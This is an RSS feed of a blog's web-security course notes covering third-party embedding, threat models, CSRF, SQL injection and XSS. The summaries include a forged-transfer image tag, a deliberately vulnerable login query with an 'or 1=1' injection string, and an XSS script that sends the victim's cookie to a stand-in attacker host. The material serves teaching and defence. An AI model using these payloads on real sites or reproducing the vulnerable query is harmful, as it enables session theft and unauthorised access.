<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>11. Web Security on c13u&#39;s Blog</title>
    <link>https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/</link>
    <description>Recent content in 11. Web Security on c13u&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 21 Nov 2018 00:00:00 +0000</lastBuildDate><atom:link href="https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Web Applications 101</title>
      <link>https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/01-web-applications-101/</link>
      <pubDate>Wed, 21 Nov 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/01-web-applications-101/</guid>
      <description>How does a page embed content from other domains? Method 1: Loading a third party script that modifies the page.
1 2 3 4 5  &amp;lt;html&amp;gt; &amp;lt;!-- Page Content --&amp;gt; &amp;lt;div id=&amp;#34;widget&amp;#34;&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;script src=&amp;#34;https://third-party.com/widget.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;/html&amp;gt;   Method 2: Loading a third party resource in an iframe.
1 2 3 4  &amp;lt;html&amp;gt; &amp;lt;!-- Page Content --&amp;gt; &amp;lt;iframe src=&amp;#34;https://third-party.com/widget.js&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;/html&amp;gt;   How do you stay logged in w/o re-entering password?</description>
    </item>
    
    <item>
      <title>02. Threat Models for Web Security</title>
      <link>https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/02-threat-models/</link>
      <pubDate>Wed, 21 Nov 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/02-threat-models/</guid>
      <description>#1: Network Adversary Addressed by secure communication protocols (+ network security)
#2: User visits adversary&amp;rsquo;s page Variants:
 Attacker gets the user to click a link, e.g. one that adds an item to their shopping cart. Attacker gets the user&amp;rsquo;s browser to request a link  #3: Adversary is a third-party 1  &amp;lt;iframe src=&amp;#34;https://third-party.com/widget&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt;   Note that an adversary script being embedded directly, e.g. through a &amp;lt;script&amp;gt; tag is not a threat model!</description>
    </item>
    
    <item>
      <title>03. Cross-Site Request Forgery (XSRF)</title>
      <link>https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/03-cross-site-request-forgery/</link>
      <pubDate>Wed, 21 Nov 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/03-cross-site-request-forgery/</guid>
      <description>Cross-site Request Forgery (XSRF) 1  &amp;lt;img src=&amp;#34;http://bank.com/transfer?from=from_ID&amp;amp;to=to_ID&amp;amp;value=1000&amp;#34;&amp;gt;   Because the user is logged in and has a cookie, the victim site trusts the user&amp;rsquo;s browser.
The attacker gets user/browser to execute command on victim site, e.g. request a link, post a form. The command has permanent effects.
A frame can navigate its immediate children. Why is it designed such that it can&amp;rsquo;t navigate its children too?
Consider a website with a login frame, where the user inputs passwords.</description>
    </item>
    
    <item>
      <title>SQL Injection</title>
      <link>https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/05-sql-injection/</link>
      <pubDate>Sun, 25 Nov 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/05-sql-injection/</guid>
      <description>In a SQL injection attack, the attacker provides malicious form input that is fed into a DB server.
Outcomes may include data deletion, bypassing access control, etc.
Sample Buggy Login Server side code:
1 2 3 4 5 6  results = db.execute( &amp;#34;SELECT * FROM Users WHERE user=&amp;#39;&amp;#34; + form[&amp;#34;user&amp;#34;] + &amp;#34;&amp;#39; &amp;#34; + &amp;#34;AND pwd=&amp;#39;&amp;#34; + form[&amp;#34;pwd&amp;#34;] + &amp;#34;&amp;#39;&amp;#34;) if results: login(results) else: login_failed(form)   An attacker can supply &#39; or 1=1 -- as the value for user.</description>
    </item>
    
    <item>
      <title>Cross-Site Scripting (XSS)</title>
      <link>https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/04-cross-site-scripting/</link>
      <pubDate>Wed, 21 Nov 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/04-cross-site-scripting/</guid>
      <description>XSS 101 Suppose a site, given a non-existent path, e.g. htpp://victim.com/path, writes this error message:
Error 404! `path` not found. An attacker can then lead a user to opening http://victim.com/attacker_supplied_string, where attacker_supplied_string is:
1 2 3 4  &amp;lt;script&amp;gt; let addr = &amp;#34;http://attacker.com/?&amp;#34; + escape(document.cookie); document.write(`&amp;lt;img src=&amp;#34;${addr}&amp;#34; /&amp;gt;`); &amp;lt;/script&amp;gt;   Suppose a site uses Force HTTPS. If a &amp;lt;script src=&amp;quot;http://...&amp;quot;&amp;gt; is not redirected to a HTTPS url, then an active attacker would still replace the JS code in the HTTP response with the malicious code that would run on the HTTPS page!</description>
    </item>
    
  </channel>
</rss>
